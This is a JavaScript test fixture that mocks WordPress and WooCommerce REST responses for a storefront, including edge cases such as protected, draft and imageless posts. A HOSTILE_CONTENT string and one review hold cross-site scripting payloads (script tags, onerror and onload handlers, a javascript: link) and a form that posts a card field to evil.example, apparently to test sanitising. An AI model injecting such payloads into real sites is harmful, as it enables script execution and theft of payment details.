// SYNTHETIC WordPress REST content (wp/v2) for the mock store. Shaped like WordPress answers, including the awkward parts the
// storefront must survive: markup that must be removed, protected and draft posts, entity-encoded titles, a post with no image.
// None of it is the owner's content.

const term = (id, name, slug, taxonomy, count) => ({ id, name, slug, taxonomy, count });

export const HOSTILE_CONTENT = [
  '<h1 id="main">A heading that tries to take the page\'s id</h1>',
  '<p>Safe paragraph with <strong>bold</strong> text.</p>',
  '<script>window.__pwned = true; document.title = "pwned";</script>',
  '<p><img src="https://images.example/x.png" onerror="window.__pwned=true" alt="A picture"></p>',
  '<p><a href="javascript:window.__pwned=true">javascript link</a> and <a href="https://example.org/ok">external link</a></p>',
  '<p style="position:fixed;top:0;left:0;width:100vw;height:100vh">styled paragraph</p>',
  '<form action="https://evil.example/steal"><input name="card" value="x"><button>Send</button></form>',
  '<iframe src="https://evil.example/frame" width="300" height="200"></iframe>',
  '<figure class="wp-block-embed"><div class="wp-block-embed__wrapper"><iframe title="Video" width="640" height="360" src="https://www.youtube.com/embed/aqz-KE-bpKQ?feature=oembed" allowfullscreen></iframe></div></figure>',
  '<p><a href="__HOST__/second-post/">Link to another post</a> and <a href="__HOST__/product/synthetic-mug/">a product</a> and <a href="__HOST__/checkout/">the checkout</a>.</p>',
  '<svg onload="window.__pwned=true"><circle r="5"/></svg>',
  '<p class="button" data-x="1">class and data attribute</p>',
].join('');

export function createWpFixture(host) {
  const media = [
    {
      id: 700,
      source_url: `${host}/images/post.svg`,
      alt_text: 'A synthetic workshop picture',
      media_type: 'image',
      media_details: { width: 800, height: 500 },
    },
  ];
  const categories = [
    term(1, 'Uncategorized', 'uncategorized', 'category', 1),
    term(5, 'Updates &amp; News', 'updates', 'category', 3),
  ];
  const tags = [term(9, 'Printing', 'printing', 'post_tag', 2)];

  const post = (id, slug, title, date, extra = {}) => ({
    id,
    slug,
    status: 'publish',
    type: 'post',
    date_gmt: `${date}T09:30:00`,
    modified_gmt: `${date}T09:30:00`,
    link: `${host}/${slug}/`,
    title: { rendered: title },
    excerpt: { rendered: `<p>Excerpt of ${slug} [&hellip;]</p>`, protected: false },
    content: { rendered: `<p>Body of ${slug}.</p>`, protected: false },
    categories: [5],
    tags: [],
    featured_media: 0,
    ...extra,
  });

  const embedFor = (row) => ({
    ...(row.featured_media ? { 'wp:featuredmedia': media } : {}),
    'wp:term': [
      categories.filter((c) => row.categories.includes(c.id)),
      tags.filter((t) => row.tags.includes(t.id)),
    ],
  });

  const posts = [
    post(30, 'hostile-content-test', 'Hostile content &#8211; test &amp; check', '2026-10-10', {
      content: { rendered: HOSTILE_CONTENT.replaceAll('__HOST__', host), protected: false },
      featured_media: 700,
      tags: [9],
    }),
    post(29, 'second-post', 'The second post', '2026-10-05', { tags: [9] }),
    post(28, 'no-image-post', 'A post without a picture', '2026-09-30', { categories: [1] }),
    post(27, 'protected-post', 'Secret post', '2026-09-29', {
      content: { rendered: '<p>Secret text</p>', protected: true },
      excerpt: { rendered: '<p>Secret excerpt</p>', protected: true },
    }),
    post(26, 'draft-post', 'Draft post', '2026-09-28', { status: 'draft' }),
  ];

  const pages = [
    {
      ...post(40, 'our-story', 'Our Story', '2026-09-01'),
      type: 'page',
      categories: undefined,
      tags: undefined,
      excerpt: { rendered: '<p>The owner wrote this synthetic story.</p>', protected: false },
      content: {
        rendered:
          '<p>This synthetic page stands in for the story the owner writes in WordPress.</p><h2>A heading</h2><p>More words.</p>',
        protected: false,
      },
    },
  ];

  return { media, categories, tags, posts, pages, embedFor, post, failing: false };
}

const wanted = (value) =>
  String(value ?? '')
    .split(',')
    .map((v) => v.trim())
    .filter(Boolean);

const pick = (row, fields) => {
  if (!fields.length) return row;
  const out = {};
  for (const key of fields) if (key in row) out[key] = row[key];
  return out;
};

/** Answers one wp/v2 GET. Returns { status, body, headers }. Like WordPress, `_fields` limits what comes back. */
export function answerWp(url, wp) {
  if (wp.failing) return { status: 503, body: { code: 'mock_wp_down' }, headers: {} };
  const route = url.pathname.replace('/wp-json/wp/v2', '').replace(/\/$/, '');
  const fields = wanted(url.searchParams.get('_fields'));
  const embed = url.searchParams.has('_embed');
  const perPage = Math.min(100, Number(url.searchParams.get('per_page') ?? 10));
  const page = Number(url.searchParams.get('page') ?? 1);

  let rows;
  if (route === '/posts' || route === '/pages') {
    // The public API lists published, non-draft content only.
    rows = (route === '/posts' ? wp.posts : wp.pages).filter((r) => r.status === 'publish');
    rows = [...rows].sort((a, b) => b.date_gmt.localeCompare(a.date_gmt));
    const cat = wanted(url.searchParams.get('categories'));
    const tag = wanted(url.searchParams.get('tags'));
    if (cat.length)
      rows = rows.filter((r) => (r.categories ?? []).some((c) => cat.includes(String(c))));
    if (tag.length) rows = rows.filter((r) => (r.tags ?? []).some((t) => tag.includes(String(t))));
    // WordPress: has_password=false leaves out password-protected content (its counts and pages follow).
    if (url.searchParams.get('has_password') === 'false') {
      rows = rows.filter((r) => !r.content?.protected);
    }
    const slugs = wanted(url.searchParams.get('slug'));
    if (slugs.length) rows = rows.filter((r) => slugs.includes(r.slug));
  } else if (route === '/categories' || route === '/tags') {
    rows = route === '/categories' ? wp.categories : wp.tags;
    if (url.searchParams.get('hide_empty') === 'true') rows = rows.filter((r) => r.count > 0);
  } else {
    return { status: 404, body: { code: 'rest_no_route' }, headers: {} };
  }

  const totalPages = Math.max(1, Math.ceil(rows.length / perPage));
  if (page > totalPages && rows.length > 0) {
    return { status: 400, body: { code: 'rest_post_invalid_page_number' }, headers: {} };
  }
  const slice = rows.slice((page - 1) * perPage, page * perPage).map((row) => {
    const withEmbed =
      embed && row.categories ? { ...row, _embedded: wp.embedFor(row) } : { ...row };
    return pick({ ...withEmbed, _links: {} }, fields);
  });
  return {
    status: 200,
    body: slice,
    headers: { 'x-wp-total': String(rows.length), 'x-wp-totalpages': String(totalPages) },
  };
}

// ---- WooCommerce Store API reviews (GET /wp-json/wc/store/v1/products/reviews): public, approved reviews only, no email address.
export function createReviewsFixture() {
  const row = (id, productId, name, reviewer, rating, day, html, verified) => ({
    id,
    date_created: `${day}T11:00:00`,
    date_created_gmt: `${day}T15:00:00`,
    product_id: productId,
    product_name: name,
    product_permalink: `https://shop.example/product/${productId}/`,
    reviewer,
    review: html,
    rating,
    verified,
    reviewer_avatar_urls: { 24: 'https://secure.gravatar.com/avatar/x?s=24' },
  });
  return {
    failing: false,
    rows: [
      row(
        501,
        201,
        'Synthetic Card Case Alpha',
        'Alice Smith',
        5,
        '2026-10-11',
        '<p>Great case!<br />Fits &amp; looks solid.</p>',
        true,
      ),
      row(
        502,
        201,
        'Synthetic Card Case Alpha',
        'bob@example.com',
        4,
        '2026-10-09',
        '<p>Nice.<script>window.__pwned=1</script></p>',
        false,
      ),
      row(
        503,
        201,
        'Synthetic Card Case Alpha',
        'Replier',
        0,
        '2026-10-12',
        '<p>A reply without a rating</p>',
        false,
      ),
      row(
        504,
        999,
        'A product the shop does not list',
        'Zed Q',
        5,
        '2026-10-13',
        '<p>Review of a product that is not in the catalog</p>',
        false,
      ),
    ],
  };
}

export function answerStoreReviews(url, reviews) {
  if (reviews.failing) return { status: 503, body: { code: 'mock_wc_down' }, headers: {} };
  if (url.pathname.replace(/\/$/, '') !== '/wp-json/wc/store/v1/products/reviews') {
    return { status: 404, body: { code: 'rest_no_route' }, headers: {} };
  }
  const perPage = Math.min(100, Number(url.searchParams.get('per_page') ?? 10));
  const page = Number(url.searchParams.get('page') ?? 1);
  let rows = [...reviews.rows].sort((a, b) => b.date_created_gmt.localeCompare(a.date_created_gmt));
  const productId = url.searchParams.get('product_id');
  if (productId) rows = rows.filter((r) => String(r.product_id) === productId);
  const totalPages = Math.max(1, Math.ceil(rows.length / perPage));
  if (page > totalPages && rows.length > 0) {
    return { status: 400, body: { code: 'rest_invalid_page_number' }, headers: {} };
  }
  return {
    status: 200,
    body: rows.slice((page - 1) * perPage, page * perPage),
    headers: { 'x-wp-total': String(rows.length), 'x-wp-totalpages': String(totalPages) },
  };
}
